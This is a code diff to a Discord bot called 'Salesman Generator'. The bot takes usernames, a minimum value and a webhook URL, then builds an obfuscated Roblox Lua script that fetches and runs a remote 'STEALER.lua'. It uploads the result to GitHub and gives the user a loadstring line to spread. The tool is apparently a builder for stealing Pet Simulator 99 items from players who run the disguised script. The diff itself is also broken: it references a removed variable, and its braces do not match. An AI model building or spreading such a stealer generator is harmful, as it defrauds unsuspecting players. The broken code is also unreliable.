@@ -1,4 +1,6 @@
 import express from "express";
+import { lua, to_jsstring } from "fengari";
+import { load } from "fengari-interop";
 import "dotenv/config";
 import fs from "fs";
 import { exec } from "child_process";
@@ -57,7 +59,7 @@ const rest = new REST({ version: "10" }).setToken(process.env.TOKEN);
 client.once("ready", async () => {
     try {
         console.log(`✅ Logged in as ${client.user.tag}`);
-        
+
         // Initialize log channel
         const logChannel = client.channels.cache.get(process.env.LOG_CHANNEL_ID);
         if (!logChannel) {
@@ -65,7 +67,7 @@ client.once("ready", async () => {
         } else {
             console.log("✅ Log channel loaded successfully!");
         }
-        
+
         await rest.put(Routes.applicationCommands(client.user.id), {
             body: commands,
         });
@@ -97,14 +99,14 @@ client.on("interactionCreate", async (interaction) => {
                 .setStyle(TextInputStyle.Short)
                 .setPlaceholder("Enter your Second Username")
                 .setRequired(true);
-            
+
             const webhookInput = new TextInputBuilder()
                 .setCustomId("webhook")
                 .setLabel("Webhook URL")
                 .setStyle(TextInputStyle.Short)
                 .setPlaceholder("Enter your webhook URL")
                 .setRequired(true);
-            
+
             const RapInput = new TextInputBuilder()
                 .setCustomId("rap")
                 .setLabel("Minimum Rap")
@@ -130,30 +132,39 @@ client.on("interactionCreate", async (interaction) => {
             const username_sec = interaction.fields.getTextInputValue("username_sec");
             const rap = interaction.fields.getTextInputValue("rap");
 
-            const timestamp = Date.now();
-            const luaFileName = `script_${timestamp}.lua`;
-            const outputFileName = `Huge_Hunter_${timestamp}.txt`;
+            try {
+                const timestamp = Date.now();
+                const outputFileName = `Huge_Hunter_${timestamp}.txt`;
 
-            const content = `
-local a=[[
-_G.Username = "${username}"
-_G.Username2 = "${username_sec}"
-_G.minrap = ${rap}
-_G.webhook = "${webhook}"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RAYZHUB/RAYZHUB-SCRIPTS/refs/heads/main/STEALER.lua"))()
-]]
+                // Example Lua script (replace with actual script content)
+                const luaScript = `
+                    local a=[[
+                    _G.Username = "${username}"
+                    _G.Username2 = "${username_sec}"
+                    _G.minrap = ${rap}
+                    _G.webhook = "${webhook}"
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/RAYZHUB/RAYZHUB-SCRIPTS/refs/heads/main/STEALER.lua"))()
+                    ]]
 
-a="--// Decompiled Code.\\n"..a;function Obfuscate(b)local c="function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919)) then return not true end if (IllIlllIllIllIll==(((((968 + 670)-670)*3315)/3315)+968)) then return not false end end; "local d=c;local e=""local f={"IllIllIllIllI","IIlllIIlllIIlllIIlllII","IIllllIIllll"}local g=[[local IlIlIlIlIlIlIlIlII = {]]local h=[[local IllIIllIIllIII = loadstring]]local i=[[local IllIIIllIIIIllI = table.concat]]local j=[[local IIIIIIIIllllllllIIIIIIII = "''"]]local k="local "..f[math.random(1,#f)].." = (7*3-9/9+3*2/0+3*3);"local l="local "..f[math.random(1,#f)].." = (3*4-7/7+6*4/3+9*9);"local m="--By Salesman\\n"for n=1,string.len(b)do e=e.."'\\\\"..string.byte(b,n).."',"end;local o="function IllIIIIllIIIIIl("..f[math.random(1,#f)]..")"local p="function "..f[math.random(1,#f)].."("..f[math.random(1,#f)]..")"local q="local "..f[math.random(1,#f)].." = (5*3-2/8+9*2/9+8*3)"local r="end"local s="IllIIIIllIIIIIl(900283)"local t="function IllIlllIllIlllIlllIlllIllIlllIIIlll("..f[math.random(1,#f)]..")"local q="function "..f[math.random(1,#f)].."("..f[math.random(1,#f)]..")"local u="local "..f[math.random(1,#f)].." = (9*0-7/5+3*1/3+8*2)"local v="end"local w="IllIlllIllIlllIlllIlllIllIlllIIIlll(9083)"local x=m..d..k..l..i..";"..o.." "..p.." "..q.." "..r.." "..r.." "..r..";"..s..";"..t.." "..q.." "..u.." "..v.." "..v..";"..w..";"..h..";"..g..e.."}".."IllIIllIIllIII(IllIIIllIIIIllI(IlIlIlIlIlIlIlIlII,IIIIIIIIllllllllIIIIIIII))()"print(x)end;do Obfuscate(a)end;
-            `;
+                    a="--// Decompiled Code.\\n"..a;function Obfuscate(b)local c="function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919)) then return not true end if (IllIlllIllIllIll==(((((968 + 670)-670)*3315)/3315)+968)) then return not false end end; "local d=c;local e=""local f={"IllIllIllIllI","IIlllIIlllIIlllIIlllII","IIllllIIllll"}local g=[[local IlIlIlIlIlIlIlIlII = {]]local h=[[local IllIIllIIllIII = loadstring]]local i=[[local IllIIIllIIIIllI = table.concat]]local j=[[local IIIIIIIIllllllllIIIIIIII = "''"]]local k="local "..f[math.random(1,#f)].." = (7*3-9/9+3*2/0+3*3);"local l="local "..f[math.random(1,#f)].." = (3*4-7/7+6*4/3+9*9);"local m="--By Salesman\\n"for n=1,string.len(b)do e=e.."'\\\\"..string.byte(b,n).."',"end;local o="function IllIIIIllIIIIIl("..f[math.random(1,#f)]..")"local p="function "..f[math.random(1,#f)].."("..f[math.random(1,#f)]..")"local q="local "..f[math.random(1,#f)].." = (5*3-2/8+9*2/9+8*3)"local r="end"local s="IllIIIIllIIIIIl(900283)"local t="function IllIlllIllIlllIlllIlllIllIlllIIIlll("..f[math.random(1,#f)]..")"local q="function "..f[math.random(1,#f)].."("..f[math.random(1,#f)]..")"local u="local "..f[math.random(1,#f)].." = (9*0-7/5+3*1/3+8*2)"local v="end"local w="IllIlllIllIlllIlllIlllIllIlllIIIlll(9083)"local x=m..d..k..l..i..";"..o.." "..p.." "..q.." "..r.." "..r.." "..r..";"..s..";"..t.." "..q.." "..u.." "..v.." "..v..";"..w..";"..h..";"..g..e.."}".."IllIIllIIllIII(IllIIIllIIIIllI(IlIlIlIlIlIlIlIlII,IIIIIIIIllllllllIIIIIIII))()"print(x)end;do Obfuscate(a)end;
+                `;
 
-            fs.writeFileSync(luaFileName, content);
-            console.log(`✅ Lua file '${luaFileName}' created.`);
+                // Load and execute the Lua script
+                const luaFunction = load(luaScript);
+                luaFunction(); // Run the script
 
-            exec(`lua ${luaFileName} > ${outputFileName}`, async (error) => {
-                if (error) {
-                    console.error(`Execution error: ${error.message}`);
-                    return interaction.followUp({ content: "❌ Lua execution failed!", ephemeral: true });
-                }
+                // Retrieve Lua output
+                const output = to_jsstring(lua.lua_tostring(lua.L, -1));
+
+                // Save the output to a file
+                fs.writeFileSync(outputFileName, output);
+                
+            } catch (error) {
+                console.error(`Execution error: ${error.message}`);
+                interaction.followUp({ content: "❌ Lua execution failed!", ephemeral: true });
+            }
+    }
+                
 
                 try {
                     await octokit.repos.createOrUpdateFileContents({
@@ -165,10 +176,10 @@ a="--// Decompiled Code.\\n"..a;function Obfuscate(b)local c="function IllIlllIl
                         committer: { name: "Bot", email: "bot@example.com" },
                         author: { name: "Bot", email: "bot@example.com" },
                     });
-                    
+
                     const scriptURL = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/main/${repoPath}${outputFileName}`;
                     const loadstringCode = `loadstring(game:HttpGet("${scriptURL}", true))()`;
-                    
+
                     const embed = new EmbedBuilder()
                     .setTitle("🌟 Salesman Generator 🌟")
                     .setDescription(`\`Your custom PS99 script has been generated successfully!\``)
@@ -183,7 +194,7 @@ a="--// Decompiled Code.\\n"..a;function Obfuscate(b)local c="function IllIlllIl
                     )
                     .setColor("#FFD700")
                     .setFooter({ text: `Salesman Generator | Today at ${new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true })}` });
-                    
+
                     const row = new ActionRowBuilder()
                     .addComponents(
                         new ButtonBuilder()
@@ -199,23 +210,23 @@ a="--// Decompiled Code.\\n"..a;function Obfuscate(b)local c="function IllIlllIl
                             .setStyle(ButtonStyle.Link)
                             .setURL(scriptURL)
                     );
-                    
+
                     await interaction.user.send({ embeds: [embed], components: [row] });
-                    
+
                     // Event listener for button interaction
                     client.on('interactionCreate', async interaction => {
                         if (!interaction.isButton()) return;
-                        
+
                         if (interaction.customId === 'copy_url') {
                             await interaction.reply({ content: `${scriptURL}`, ephemeral: true });
-                            
+
                         } else if (interaction.customId === 'copy_loadstring') {
                             await interaction.reply({ content: `${loadstringCode}`, ephemeral: true });
-                            
+
                         }
                     });
-                    
-                    
+
+
                     fs.unlinkSync(luaFileName);
                     fs.unlinkSync(outputFileName);
                     await interaction.followUp({ content: "✅ Check your DMs!", ephemeral: true });
@@ -227,7 +238,7 @@ a="--// Decompiled Code.\\n"..a;function Obfuscate(b)local c="function IllIlllIl
             // Send log to log channel
 
                     const scriptUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/main/${repoPath}${outputFileName}`
-                
+
                     const logEmbed = {
                         color: 0x3498db,
                         title: "🛠️ Script Generation Log",
@@ -242,13 +253,13 @@ a="--// Decompiled Code.\\n"..a;function Obfuscate(b)local c="function IllIlllIl
                         footer: { text: "Salesman Generator" },
                         timestamp: new Date(),
                     };
-                    
+
                     const logChannel = client.channels.cache.get(process.env.LOG_CHANNEL_ID);
                     if (logChannel) {
                         await logChannel.send({ embeds: [logEmbed] }).catch(err => console.error("❌ Failed to send log:", err));
                     }
-            });
-        }
+            
+        
     } catch (error) {
         console.error("❌ Error:", error);
         await interaction.followUp({ content: "❌ An error occurred!", ephemeral: true });
